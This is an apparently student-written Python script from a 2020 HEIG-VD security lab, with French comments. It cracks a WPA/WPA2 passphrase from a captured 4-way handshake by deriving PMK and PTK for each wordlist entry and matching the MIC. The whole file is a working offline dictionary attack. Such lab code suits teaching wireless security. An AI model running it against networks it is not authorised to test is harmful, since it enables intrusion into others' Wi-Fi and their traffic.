#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Grâce au calcule du MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA) de chaque passPhrase et la comparaison de ce dernier avec le mic récupéré par wireshark,
cela nous permet de truver la passphrase dans un dictionnaire
"""

__author__      = "Volkan Sütcü et Julien Benoit"
__copyright__   = "Copyright 2020, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "julien.benoit@heig-vd.ch et volkan.sutcu@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2_math import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.pcap") 

# Récupértion des frames utiles, à savoir le beacon frame, ainsi que les handshake 1,2 et 4
beaconFrame = wpa[0]
handshake1 = wpa[5]
handshake2 = wpa[6]
handshake4 = wpa[8]

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = beaconFrame.info.decode()
# On remplace les ":"" par "" dans les mac adresses du client et de l'AP, afin de les transformer en bytes
APmac       = a2b_hex(str.replace(handshake1.addr2, ":", ""))
Clientmac   = a2b_hex(str.replace(handshake1.addr1, ":", ""))

# Authenticator and Supplicant Nonces
# En commençant depuis le key descriptor type, nous prenons les bytes n°13 à 45 qui corresponde à ANonce, respectivement SNonce
ANonce      = handshake1.load[13:45]
SNonce      = handshake2.load[13:45]

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = handshake4.load[-18:-2]

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

# Nous récupérons la partie EAPOL du hanshake4 jusqu'à la MIC (non compris) et on ajoute 18 bytes à 0 pour correspondre à la taille du data précédement fourni
data        = bytes(handshake4['EAPOL'])[:81] + b'\x00' * 18


print ("\n\nValues used to derivate keys")
print ("============================")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("AP Nonce: ",b2a_hex(ANonce),"\n")
print ("Client Nonce: ",b2a_hex(SNonce),"\n")

passPhraseFile = "passPhraseFile.txt"
passPhraseFound = "la passPhrase n'a pas été trouvée"
ssid = str.encode(ssid)

# Permet de parcourir le fichier de passPhrases
with open(passPhraseFile) as passPhraseFile:
    for passPhrase in passPhraseFile:
        # Permet d'enlever le \n en fin de ligne s'il y en a un
        if passPhrase[-1:] == "\n":
            passPhrase = passPhrase[:-1]
        
        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(passPhrase)
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

        #expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        # Permet d'identifier le type de hash devant être utilisé
        mic = hmac.new(ptk[0:16],data,hashlib.md5) if int.from_bytes(handshake1.load[0:1], byteorder='big') != 2 else hmac.new(ptk[0:16],data,hashlib.sha1)

        # Si le mic calculé correspond au mic récupéré, alors la passPhrase a été trouvée
        if mic.hexdigest()[:-8] == b2a_hex(mic_to_test).decode():

            print ("\nResults of the key expansion")
            print ("=============================")
            print ("PMK:\t\t",pmk.hex(),"\n")
            print ("PTK:\t\t",ptk.hex(),"\n")
            print ("KCK:\t\t",ptk[0:16].hex(),"\n")
            print ("KEK:\t\t",ptk[16:32].hex(),"\n")
            print ("TK:\t\t",ptk[32:48].hex(),"\n")
            print ("MICK:\t\t",ptk[48:64].hex(),"\n")
            print ("MIC:\t\t",mic.hexdigest(),"\n")
            passPhraseFound = passPhrase.decode()
            break

    
    print ("\nResult of the passPhrase")
    print ("=============================")
    print("PassPhrase:\t", passPhraseFound,"\n")

            